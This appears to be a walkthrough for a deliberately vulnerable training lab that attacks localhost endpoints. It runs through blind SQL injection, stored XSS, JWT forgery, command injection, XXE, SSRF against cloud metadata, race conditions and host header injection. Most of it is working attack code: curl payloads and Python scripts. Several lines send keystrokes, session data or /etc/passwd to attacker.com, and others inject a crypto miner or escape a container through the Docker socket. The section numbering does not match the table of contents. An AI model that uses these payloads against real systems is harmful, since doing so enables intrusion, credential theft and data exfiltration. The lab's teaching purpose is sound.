# Zeroday Academy - Intermediate Labs Walkthrough

**Advanced exploitation techniques for experienced penetration testers**

---

## Table of Contents

1. [Blind SQL Injection (Advanced)](#1-blind-sql-injection-advanced)
2. [Stored XSS with Filter Bypass](#2-stored-xss-with-filter-bypass)
3. [Advanced Authentication Bypass](#3-advanced-authentication-bypass)
4. [Command Injection with Filter Evasion](#4-command-injection-with-filter-evasion)
5. [Advanced Data Exposure Techniques](#5-advanced-data-exposure-techniques)
6. [XXE with Out-of-Band Exploitation](#6-xxe-with-out-of-band-exploitation)
7. [Complex Access Control Bypass](#7-complex-access-control-bypass)
8. [Advanced Security Misconfiguration](#8-advanced-security-misconfiguration)
9. [Advanced Deserialization Attacks](#9-advanced-deserialization-attacks)

---

## 1. Blind SQL Injection (Advanced)

### Vulnerability Description
Advanced blind SQL injection techniques including boolean-based, time-based, and error-based extraction methods. This lab simulates real-world scenarios where direct output is not available.

### Impact
- Complete database enumeration without visible output
- Automated data extraction through scripted attacks
- Bypassing advanced filtering mechanisms
- Privilege escalation through stored procedures

### Advanced Solution Steps

#### Step 1: Boolean-Based Blind SQL Injection
**Objective:** Extract data using conditional true/false responses

**Using curl with automated character extraction:**
```bash
#!/bin/bash
# Script to extract admin password character by character
password=""
for i in {1..20}; do
  for ascii in {32..126}; do
    response=$(curl -s "http://localhost:5000/api/vuln/sqli-advanced?id=1' AND ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),$i,1))=$ascii--")
    if [[ $response == *"TRUE"* ]]; then
      char=$(printf "\\$(printf '%03o' $ascii)")
      password+=$char
      echo "Character $i: $char (Password so far: $password)"
      break
    fi
  done
done
```

**Using Burp Suite with Intruder:**
1. Send request to Intruder
2. Set payload position: `1' AND ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),§1§,1))>§65§--`
3. Configure two payload sets:
   - Position 1: Numbers 1-50 (character position)
   - Position 2: Numbers 32-126 (ASCII values)
4. Set attack type to "Cluster Bomb"
5. Use grep matching to identify successful extractions

#### Step 2: Time-Based Blind SQL Injection
**Objective:** Use time delays for data extraction

**Using curl with timing analysis:**
```bash
#!/bin/bash
# Time-based extraction with automated timing
for i in {1..20}; do
  for ascii in {32..126}; do
    start_time=$(date +%s.%N)
    curl -s "http://localhost:5000/api/vuln/sqli-advanced?username=admin'; IF(ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),$i,1))=$ascii,SLEEP(3),SLEEP(0))--"
    end_time=$(date +%s.%N)
    duration=$(echo "$end_time - $start_time" | bc)
    
    if (( $(echo "$duration > 2.5" | bc -l) )); then
      char=$(printf "\\$(printf '%03o' $ascii)")
      echo "Character $i: $char"
      break
    fi
  done
done
```

**Using Burp Suite with response timing:**
1. Send to Intruder with payload: `admin'; IF(ASCII(SUBSTR((SELECT password FROM users WHERE role='admin'),§1§,1))=§65§,SLEEP(5),SLEEP(0))--`
2. Configure Cluster Bomb attack with position and ASCII values
3. Sort results by "Response received" timing
4. Identify responses with 5+ second delays

#### Step 3: Error-Based SQL Injection
**Objective:** Extract data through SQL error messages

**Using curl with error extraction:**
```bash
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1),0x7e))--"
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1)--"
```

**Advanced error-based techniques:**
```bash
# Double query error injection
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT CONCAT(0x7e,password,0x7e) FROM users)x GROUP BY x HAVING COUNT(*)>1)--"

# BIGINT overflow error injection
curl "http://localhost:5000/api/vuln/sqli-advanced?payload=1' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,password,0x7e) FROM users LIMIT 1)x))--"
```

### Advanced Prevention Measures
1. Implement query result randomization
2. Use database query firewalls
3. Implement sophisticated input validation with context-aware filtering
4. Use database activity monitoring (DAM)
5. Implement query execution time limits

---

## 2. Stored XSS with Filter Bypass

### Vulnerability Description
Advanced cross-site scripting attacks that persist in the application database and employ sophisticated filter evasion techniques.

### Impact
- Persistent payload execution for all users
- Advanced social engineering attacks
- Cryptocurrency mining injection
- Advanced phishing campaigns

### Advanced Solution Steps

#### Step 1: Identify Storage Mechanisms
**Objective:** Find where user input gets permanently stored

**Using curl to test comment storage:**
```bash
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -H "Content-Type: application/json" \
  -d '{"comment":"<script>alert(1)</script>","name":"tester"}'
```

**Using Burp Suite:**
1. Intercept POST requests to comment/profile endpoints
2. Modify JSON/form data with test payloads
3. Use Repeater to test various input fields
4. Check if payloads persist across page reloads

#### Step 2: Advanced Filter Bypass Techniques
**Objective:** Evade sophisticated XSS filters and WAFs

**Using curl with advanced payloads:**
```bash
# WAF bypass techniques
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'

# Filter bypass with encoding
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>'

# DOM clobbering
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<form id=test><input name=action><input name=method></form><script>test.action="javascript:alert(1)"</script>'
```

**Advanced Burp Suite techniques:**
1. Use Burp's "Hackvertor" extension for encoding bypasses
2. Configure custom payload processors in Intruder
3. Use Collaborator for out-of-band XSS detection

#### Step 3: Advanced Payload Development
**Objective:** Create sophisticated attack payloads

**Using curl with advanced payloads:**
```bash
# Keylogger injection
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<script>document.addEventListener("keydown",function(e){fetch("http://attacker.com/log?key="+e.key)})</script>'

# Cryptocurrency miner injection
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner=new CoinHive.Anonymous("YOUR_SITE_KEY");miner.start();</script>'

# Advanced session hijacking
curl -X POST "http://localhost:5000/api/vuln/xss-advanced" \
  -d 'comment=<script>fetch("/admin/users",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("http://attacker.com/exfil?data="+btoa(d)))</script>'
```

### Advanced Prevention Measures
1. Implement context-aware output encoding
2. Use Content Security Policy (CSP) with nonces and strict-dynamic
3. Implement DOM-based XSS protection
4. Use input validation with machine learning-based detection
5. Implement real-time XSS attack monitoring

---

## 3. Advanced Authentication Bypass

### Vulnerability Description
Complex authentication bypass techniques including JWT manipulation, session fixation, and race condition exploitation.

### Impact
- Complete authentication system compromise
- Privilege escalation through token manipulation
- Race condition exploitation for temporary access
- Advanced session hijacking techniques

### Advanced Solution Steps

#### Step 1: JWT Token Manipulation
**Objective:** Exploit JSON Web Token vulnerabilities

**Using curl for JWT attacks:**
```bash
# None algorithm attack
curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9."

# Algorithm confusion attack (RS256 to HS256)
curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9.SIGNATURE_USING_PUBLIC_KEY_AS_HMAC_SECRET"

# Weak secret brute force
curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -H "Authorization: Bearer $(echo -n 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW5pc3RyYXRvciJ9' | openssl dgst -sha256 -hmac 'secret' -binary | base64 | tr -d '\n')"
```

**Using Burp Suite JWT Editor:**
1. Install JWT Editor extension
2. Intercept authentication requests
3. Modify JWT claims in the extension
4. Test algorithm confusion attacks
5. Brute force weak signing secrets

#### Step 2: Session Race Condition Exploitation
**Objective:** Exploit timing vulnerabilities in authentication

**Using curl with parallel requests:**
```bash
#!/bin/bash
# Race condition attack on session validation
for i in {1..100}; do
  curl -X POST "http://localhost:5000/api/vuln/auth-advanced" \
    -d "username=admin&password=wrong&exploit=race" &
done
wait
```

**Advanced race condition with Burp Suite:**
1. Send authentication request to Intruder
2. Set attack type to "Null payloads"
3. Configure high thread count (50-100)
4. Use "Resource Pool" to control timing
5. Analyze responses for timing-based vulnerabilities

#### Step 3: Advanced Session Manipulation
**Objective:** Exploit session management vulnerabilities

**Using curl for session attacks:**
```bash
# Session fixation
curl -c cookies.txt "http://localhost:5000/api/vuln/auth-advanced?JSESSIONID=ATTACKER_CONTROLLED_SESSION"
curl -b cookies.txt -X POST "http://localhost:5000/api/vuln/auth-advanced" \
  -d "username=victim&password=password"

# Session prediction
for i in {1000..1100}; do
  curl -b "sessionid=$i" "http://localhost:5000/api/vuln/auth-advanced/profile"
done
```

### Advanced Prevention Measures
1. Implement secure JWT handling with proper algorithm validation
2. Use cryptographically secure session identifiers
3. Implement proper session timeout and invalidation
4. Use synchronization tokens for critical operations
5. Implement advanced anomaly detection for authentication patterns

---

## 4. Command Injection with Filter Evasion

### Vulnerability Description
Advanced command injection techniques that bypass input filters, WAFs, and sandboxing mechanisms.

### Impact
- Complete system compromise through filter evasion
- Advanced persistent backdoor installation
- Container escape techniques
- Advanced data exfiltration methods

### Advanced Solution Steps

#### Step 1: Filter Bypass Techniques
**Objective:** Evade command injection filters

**Using curl with evasion techniques:**
```bash
# Concatenation bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;w'h'o'a'm'i"

# Variable substitution bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;\$0 -c whoami"

# Encoding bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;\$(echo d2hvYW1p | base64 -d)"

# Wildcard bypass
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;/bin/c?t /etc/p?sswd"
```

#### Step 2: Advanced Data Exfiltration
**Objective:** Extract sensitive data through various channels

**Using curl for DNS exfiltration:**
```bash
# DNS exfiltration
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;nslookup \$(whoami).attacker.com"

# HTTP exfiltration with base64
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;curl -X POST http://attacker.com/exfil -d \"\$(cat /etc/passwd | base64 -w 0)\""

# ICMP exfiltration
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;ping -c 1 -p \$(echo \$(whoami) | xxd -p) attacker.com"
```

#### Step 3: Container Escape Techniques
**Objective:** Escape containerized environments

**Using curl for container escape:**
```bash
# Docker socket abuse
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host"

# Privileged container escape
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;echo 'evil_command' > /host_mount/tmp/backdoor.sh"

# Kubernetes service account abuse
curl -X POST "http://localhost:5000/api/vuln/command-advanced" \
  -d "ping=127.0.0.1;kubectl --token=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) get pods --all-namespaces"
```

### Advanced Prevention Measures
1. Implement application sandboxing with seccomp-bpf
2. Use container security frameworks like Falco
3. Implement runtime application self-protection (RASP)
4. Use advanced input validation with ML-based detection
5. Implement network micro-segmentation

---

## 5. Advanced Data Exposure Techniques

### Vulnerability Description
Sophisticated techniques for identifying and exploiting data exposure vulnerabilities in complex applications.

### Impact
- Advanced reconnaissance and information gathering
- Configuration file extraction from distributed systems
- Cloud metadata service exploitation
- Advanced log file analysis and data mining

### Advanced Solution Steps

#### Step 1: Cloud Metadata Exploitation
**Objective:** Extract cloud service credentials and configuration

**Using curl for cloud metadata attacks:**
```bash
# AWS metadata service
curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Azure metadata service
curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://169.254.169.254/metadata/instance/compute?api-version=2019-06-01" \
  -H "Metadata: true"

# Google Cloud metadata
curl "http://localhost:5000/api/vuln/data-exposure-advanced?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
```

#### Step 2: Advanced Configuration Discovery
**Objective:** Discover sensitive configuration files in distributed systems

**Using curl for distributed system reconnaissance:**
```bash
# Kubernetes API server discovery
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/.well-known/openid_configuration"

# Docker registry API
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/v2/_catalog"

# Elasticsearch cluster info
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/_cluster/health"

# Consul KV store
curl "http://localhost:5000/api/vuln/data-exposure-advanced?path=/v1/kv/?recurse"
```

#### Step 3: Advanced Log Analysis and Data Mining
**Objective:** Extract sensitive information from application logs

**Using curl for log exploitation:**
```bash
# Log4j exploitation
curl "http://localhost:5000/api/vuln/data-exposure-advanced" \
  -H "User-Agent: \${jndi:ldap://attacker.com/a}"

# Log injection for data extraction
curl "http://localhost:5000/api/vuln/data-exposure-advanced?search=admin' UNION SELECT password FROM users--"

# Debug log exposure
curl "http://localhost:5000/api/vuln/data-exposure-advanced?debug=true&level=ALL"
```

### Advanced Prevention Measures
1. Implement sophisticated access control for metadata services
2. Use secrets management systems like HashiCorp Vault
3. Implement log sanitization and sensitive data detection
4. Use distributed configuration management with encryption
5. Implement advanced monitoring for unusual data access patterns

---

## 6. XXE with Out-of-Band Exploitation

### Vulnerability Description
Advanced XML External Entity attacks using out-of-band techniques for data exfiltration when direct output is not available.

### Impact
- Advanced data exfiltration through DNS/HTTP channels
- Internal network reconnaissance through blind XXE
- Advanced file system enumeration
- Cloud service exploitation through XXE

### Advanced Solution Steps

#### Step 1: Out-of-Band XXE Setup
**Objective:** Establish external communication channel for data exfiltration

**Setting up attack infrastructure:**
```bash
# Setup HTTP server for data collection
python3 -m http.server 8080 &

# Setup DNS server for DNS exfiltration (requires dnslib)
python3 -c "
import socketserver
from dnslib import *

class DNSHandler(socketserver.BaseRequestHandler):
    def handle(self):
        data = self.request[0]
        query = DNSRecord.parse(data)
        print(f'DNS Query: {query.q.qname}')

server = socketserver.UDPServer(('0.0.0.0', 53), DNSHandler)
server.serve_forever()
" &
```

#### Step 2: Advanced XXE Exploitation
**Objective:** Extract data using parameter entities and external DTDs

**Using curl with external DTD:**
```bash
# Create evil.dtd on your server
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR_IP:8080/exfil?data=%file;'>">
%eval;
%exfiltrate;
EOF

# Execute XXE attack
curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://YOUR_IP:8080/evil.dtd\"> %xxe;]><root></root>"
```

#### Step 3: Advanced Network Reconnaissance
**Objective:** Use XXE for internal network scanning

**Using curl for network scanning:**
```bash
# Port scanning through XXE
for port in 22 80 443 3306 5432; do
  curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://192.168.1.1:$port\">]><root>&xxe;</root>"
done

# Service enumeration
curl -X POST "http://localhost:5000/api/vuln/xxe-advanced" \
  -H "Content-Type: application/xml" \
  -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost:6379/\">]><root>&xxe;</root>"
```

### Advanced Prevention Measures
1. Implement XML parsing with secure configurations by default
2. Use XML schema validation with strict whitelisting
3. Implement network-level protections against XXE
4. Use application-level firewalls with XML inspection
5. Implement advanced monitoring for XXE attack patterns

---

## 7. Complex Access Control Bypass

### Vulnerability Description
Advanced access control bypass techniques including IDOR chaining, privilege escalation through parameter pollution, and multi-step authorization bypass.

### Advanced Solution Steps

#### Step 1: IDOR Chain Exploitation
**Objective:** Chain multiple IDOR vulnerabilities for privilege escalation

**Using curl for IDOR chaining:**
```bash
# Step 1: Enumerate user IDs
for id in {1..100}; do
  response=$(curl -s "http://localhost:5000/api/vuln/access-control-advanced?user_id=$id")
  if [[ $response == *"admin"* ]]; then
    echo "Admin user found: ID $id"
    admin_id=$id
    break
  fi
done

# Step 2: Use discovered admin ID to access sensitive functions
curl "http://localhost:5000/api/vuln/access-control-advanced/admin?user_id=$admin_id&action=create_user"
```

### Advanced Prevention Measures
1. Implement sophisticated authorization matrices
2. Use attribute-based access control (ABAC)
3. Implement real-time access pattern analysis
4. Use zero-trust architecture principles
5. Implement advanced session management with context awareness

---

## 7. WebSocket Message Manipulation Lab

### Vulnerability Description
This lab demonstrates real-time WebSocket communication vulnerabilities where attackers can intercept, modify, and inject malicious messages to escalate privileges or execute unauthorized commands.

### Impact
- Real-time privilege escalation through message tampering
- Command injection via WebSocket payloads
- Session hijacking through WebSocket token manipulation
- Bypass of client-side security controls

### Advanced Solution Steps

#### Step 1: Establish WebSocket Connection and Intercept Traffic
**Objective:** Connect to the WebSocket server and observe message flow

**Using Browser DevTools:**
1. Open the WebSocket Manipulation Lab
2. Open Browser DevTools (F12) → Network tab → WS filter
3. Click "Connect to Chat Server"
4. Observe the WebSocket connection at `ws://localhost:5000`
5. Send a test message and watch the real-time communication

**Using Burp Suite for WebSocket Interception:**
1. Configure browser to proxy through Burp (127.0.0.1:8080)
2. In Burp, go to Proxy → Options → WebSocket interception
3. Enable "Intercept WebSocket messages"
4. Connect to the lab's WebSocket server
5. In Burp's WebSocket history, you'll see all messages

**Expected Response:** 
```json
{"type":"message","content":"Hello","user":"guest","timestamp":"..."}
```

#### Step 2: Analyze Message Structure
**Objective:** Understand the WebSocket message format to identify injection points

**Message Structure Analysis:**
```json
{
  "type": "message",           // Message type: message, status, command
  "content": "Hello World",    // User input (injectable)
  "user": "guest",             // User role (tamperable)
  "timestamp": "2025-10-02T..."
}
```

**Burp Suite Analysis:**
1. In WebSocket history, right-click on a message
2. Select "Send to Repeater"
3. In Repeater, modify the JSON payload
4. Click "Send" to test modified messages

#### Step 3: Privilege Escalation via Role Manipulation
**Objective:** Escalate from guest to admin by modifying the user role

**Using Browser Console:**
```javascript
// Intercept and modify WebSocket send function
const originalSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(data) {
  const message = JSON.parse(data);
  message.user = "admin";  // Change role to admin
  console.log("Modified message:", message);
  originalSend.call(this, JSON.stringify(message));
};

// Send message with admin privileges
ws.send(JSON.stringify({
  type: "message",
  content: "Admin message",
  user: "admin",
  timestamp: new Date().toISOString()
}));
```

**Using Burp Suite Repeater:**
1. Capture a normal message in WebSocket history
2. Send to Repeater
3. Modify the JSON:
```json
{
  "type": "message",
  "content": "Test admin access",
  "user": "admin",
  "timestamp": "2025-10-02T18:30:00Z"
}
```
4. Click "Send" and observe the response
5. **Flag reward:** `{WEBSOCKET_ADMIN_PRIVILEGE_ESCALATION}`

#### Step 4: Command Injection via WebSocket Messages
**Objective:** Execute system commands by injecting malicious payloads

**Using Burp Suite for Command Injection:**
1. In Repeater, modify the message type to "command"
2. Test various command injection payloads:

```json
{
  "type": "command",
  "content": "getUserList",
  "user": "admin",
  "timestamp": "2025-10-02T18:30:00Z"
}
```

**Advanced command injection:**
```json
{
  "type": "command",
  "content": "deleteUser; cat /etc/passwd",
  "user": "admin",
  "timestamp": "2025-10-02T18:30:00Z"
}
```

3. Send the payload and check the response
4. **Flag reward:** `{WEBSOCKET_COMMAND_INJECTION}`

#### Step 5: Automated WebSocket Exploitation
**Objective:** Create an automated script for WebSocket exploitation

**Python Script for Automated Exploitation:**
```python
import websocket
import json
import time

def on_message(ws, message):
    print(f"Received: {message}")
    data = json.loads(message)
    if "admin" in message.lower():
        print("[+] Admin privilege escalation successful!")

def on_error(ws, error):
    print(f"Error: {error}")

def on_open(ws):
    print("[*] WebSocket connection established")
    
    # Send privilege escalation payload
    exploit_payload = {
        "type": "message",
        "content": "Privilege escalation test",
        "user": "admin",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
    }
    ws.send(json.dumps(exploit_payload))
    
    # Send command injection payload
    command_payload = {
        "type": "command",
        "content": "getUserList",
        "user": "admin",
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ")
    }
    ws.send(json.dumps(command_payload))

# Connect to vulnerable WebSocket server
ws = websocket.WebSocketApp("ws://localhost:5000",
                          on_message=on_message,
                          on_error=on_error,
                          on_open=on_open)
ws.run_forever()
```

### Real-World Impact
- Chat applications with role-based access
- Real-time trading platforms
- Collaborative editing tools
- IoT device control interfaces

### Advanced Prevention Measures
1. Implement server-side message validation for all WebSocket communications
2. Use cryptographic signatures to prevent message tampering
3. Implement role-based access control on the server side
4. Rate limit WebSocket message frequency
5. Log and monitor all WebSocket command executions
6. Use WSS (WebSocket Secure) with proper TLS configuration
7. Implement WebSocket authentication tokens with short expiration

---

## 8. Race Condition Exploitation Lab

### Vulnerability Description
Race conditions occur when multiple concurrent requests exploit a time window between checking a condition (Time-of-Check) and using the result (Time-of-Use), allowing attackers to bypass security controls or manipulate resources.

### Impact
- Multiple use of single-use discount codes
- Concurrent transaction exploitation
- Balance manipulation in financial systems
- Resource exhaustion attacks
- Inventory bypass in e-commerce

### Advanced Solution Steps

#### Step 1: Identify the Race Condition Window
**Objective:** Locate the vulnerability in the discount code redemption system

**Manual Testing:**
1. Open the Race Condition Lab
2. Note the starting balance: $1000
3. Use the discount code: `DISCOUNT50`
4. Observe that the code can only be used once normally
5. **Vulnerable window:** Between checking if code is used and marking it as used

**Time-of-Check to Time-of-Use (TOCTOU) Flow:**
```
1. Server receives redemption request
2. [CHECK] Is the code already used? → NO
3. [DELAY - VULNERABLE WINDOW] ← Multiple requests can enter here
4. [USE] Mark code as used and apply discount
```

#### Step 2: Exploit with Concurrent Requests Using Burp Suite
**Objective:** Send multiple simultaneous requests to exploit the race condition

**Using Burp Suite Repeater:**
1. Capture the discount code redemption request
2. Send to Repeater
3. In Repeater, create multiple tabs with the same request (Ctrl+R)
4. Manually click "Send" on all tabs as fast as possible
5. Observe that multiple requests succeed

**Using Burp Suite Intruder (Better Method):**
1. Capture the redemption request: 
```http
POST /api/vuln/race-condition HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"code":"DISCOUNT50","accountId":"user123"}
```

2. Send to Intruder (Ctrl+I)
3. Clear all payload positions (we don't need variables)
4. Go to Intruder → Options:
   - Set "Number of threads" to 20-30 (maximum concurrency)
   - Disable payload encoding
   - Enable "Make unmodified baseline request"
5. Go to Intruder → Payloads:
   - Payload type: "Null payloads"
   - Generate: 50 payloads (50 concurrent requests)
6. Click "Start attack"
7. **Result:** Multiple requests succeed before the code is marked as used

**Expected Response (Multiple successes):**
```json
{
  "success": true,
  "message": "Discount applied successfully!",
  "newBalance": 1050
}
```

#### Step 3: Advanced Exploitation with Python Script
**Objective:** Automate the race condition exploitation with precise timing

**Python Script for Maximum Concurrency:**
```python
import requests
import concurrent.futures
import time

url = "http://localhost:5000/api/vuln/race-condition"
payload = {
    "code": "DISCOUNT50",
    "accountId": "user123"
}

def send_request(session, request_id):
    try:
        response = session.post(url, json=payload)
        result = response.json()
        if result.get("success"):
            print(f"[+] Request {request_id}: SUCCESS - Balance: {result.get('newBalance')}")
            return True
        else:
            print(f"[-] Request {request_id}: FAILED - {result.get('message')}")
            return False
    except Exception as e:
        print(f"[!] Request {request_id}: ERROR - {e}")
        return False

def exploit_race_condition(num_requests=50):
    print(f"[*] Launching {num_requests} concurrent requests...")
    
    session = requests.Session()
    successful_requests = 0
    
    # Use ThreadPoolExecutor for maximum concurrency
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        # Submit all requests at once
        futures = [executor.submit(send_request, session, i) for i in range(num_requests)]
        
        # Wait for all requests to complete
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                successful_requests += 1
    
    print(f"\n[*] Exploitation complete!")
    print(f"[+] Successful redemptions: {successful_requests}/{num_requests}")
    print(f"[+] Expected balance increase: ${successful_requests * 50}")

if __name__ == "__main__":
    exploit_race_condition(50)
```

**Expected Output:**
```
[*] Launching 50 concurrent requests...
[+] Request 1: SUCCESS - Balance: 1050
[+] Request 2: SUCCESS - Balance: 1100
[+] Request 3: SUCCESS - Balance: 1150
...
[+] Request 15: SUCCESS - Balance: 1750
[-] Request 16: FAILED - Code already used
...
[*] Exploitation complete!
[+] Successful redemptions: 15/50
[+] Expected balance increase: $750
```

#### Step 4: Balance Manipulation Verification
**Objective:** Verify the exploitation by checking the final balance

1. Check the final balance in the lab interface
2. Verify that you've applied the discount multiple times
3. **Flag reward:** `{RACE_CONDITION_EXPLOITED_MULTIPLE_USES}`

**Burp Suite Verification:**
```http
GET /api/vuln/race-condition/balance?accountId=user123 HTTP/1.1
Host: localhost:5000
```

**Expected Response:**
```json
{
  "balance": 1750,
  "appliedDiscounts": 15,
  "message": "Race condition successfully exploited"
}
```

#### Step 5: Advanced Race Condition Techniques

**Distributed Race Condition Attack:**
```python
# Use multiple IP addresses or machines for harder detection
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

def create_session_with_retry():
    session = requests.Session()
    retry = Retry(total=5, backoff_factor=0.1)
    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
    session.mount('http://', adapter)
    return session
```

**Timing Analysis:**
```python
import time

def measure_vulnerability_window():
    times = []
    for i in range(10):
        start = time.time()
        response = requests.post(url, json=payload)
        end = time.time()
        times.append(end - start)
    
    avg_time = sum(times) / len(times)
    print(f"[*] Average response time: {avg_time:.4f}s")
    print(f"[*] Vulnerable window estimate: {avg_time * 1000:.2f}ms")
```

### Real-World Scenarios
- E-commerce promotional code exploitation
- Banking transaction manipulation
- Cryptocurrency double-spending
- Limited inventory item purchases
- Vote manipulation in voting systems

### Advanced Prevention Measures
1. Implement distributed locking mechanisms (Redis, etcd)
2. Use database transactions with proper isolation levels (SERIALIZABLE)
3. Implement idempotency keys for all state-changing operations
4. Use optimistic locking with version numbers
5. Rate limit requests per user/IP
6. Implement request deduplication at the API gateway
7. Use message queues for sequential processing of critical operations
8. Monitor for unusual concurrent request patterns

---

## 9. HTTP Host Header Injection Lab

### Vulnerability Description
HTTP Host header injection vulnerabilities occur when applications trust the Host header for generating URLs, redirects, or password reset links, allowing attackers to manipulate these values for phishing, cache poisoning, or authentication bypass.

### Impact
- Password reset poisoning (credential theft)
- Web cache poisoning (widespread XSS)
- Session hijacking via crafted URLs
- SSR (Server-Side Request Forgery) attacks
- Authentication bypass in multi-tenant applications

### Advanced Solution Steps

#### Step 1: Understand the Vulnerable Password Reset Flow
**Objective:** Identify how the application uses the Host header

**Normal Password Reset Flow:**
1. User requests password reset
2. Application generates reset link: `http://[HOST_HEADER]/reset?token=abc123`
3. Link sent via email
4. User clicks link and resets password

**Vulnerable Point:** The application trusts the Host header to build the reset URL

#### Step 2: Basic Host Header Manipulation with Burp Suite
**Objective:** Inject a malicious host to capture the password reset token

**Using Burp Suite Interceptor:**
1. Open the HTTP Host Header Injection Lab
2. Enter an email: `victim@bank.com`
3. Click "Request Password Reset"
4. **Intercept the request in Burp Suite:**

**Original Request:**
```http
POST /api/vuln/host-header-injection HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"email":"victim@bank.com"}
```

5. **Modify the Host header:**
```http
POST /api/vuln/host-header-injection HTTP/1.1
Host: attacker.evil.com
Content-Type: application/json

{"email":"victim@bank.com"}
```

6. Forward the request
7. **Check the email preview** in the lab interface

**Poisoned Email Content:**
```
Subject: Password Reset Request

Click here to reset your password:
http://attacker.evil.com/reset?token=a1b2c3d4e5f6

This link will expire in 1 hour.
```

**Result:** When the victim clicks the link, their reset token is sent to `attacker.evil.com`!

#### Step 3: Advanced Host Header Injection Techniques

**Technique 1: X-Forwarded-Host Header Injection**
```http
POST /api/vuln/host-header-injection HTTP/1.1
Host: localhost:5000
X-Forwarded-Host: attacker.evil.com
Content-Type: application/json

{"email":"victim@bank.com"}
```

**Technique 2: Multiple Host Headers**
```http
POST /api/vuln/host-header-injection HTTP/1.1
Host: localhost:5000
Host: attacker.evil.com
Content-Type: application/json

{"email":"victim@bank.com"}
```

**Technique 3: Host Header with Port Injection**
```http
POST /api/vuln/host-header-injection HTTP/1.1
Host: localhost:5000@attacker.evil.com
Content-Type: application/json

{"email":"victim@bank.com"}
```

**Technique 4: Absolute URI in Request Line**
```http
POST http://attacker.evil.com/api/vuln/host-header-injection HTTP/1.1
Host: localhost:5000
Content-Type: application/json

{"email":"victim@bank.com"}
```

#### Step 4: Web Cache Poisoning via Host Header
**Objective:** Poison the cache to affect all users

**Using Burp Suite for Cache Poisoning:**

1. **Identify cacheable endpoints:**
```http
GET /api/vuln/host-header-injection/info HTTP/1.1
Host: attacker.evil.com
```

2. **Inject malicious Host header:**
```http
GET /api/vuln/host-header-injection/info HTTP/1.1
Host: attacker.evil.com"><script>alert('XSS')</script><"
Cache-Control: no-cache
```

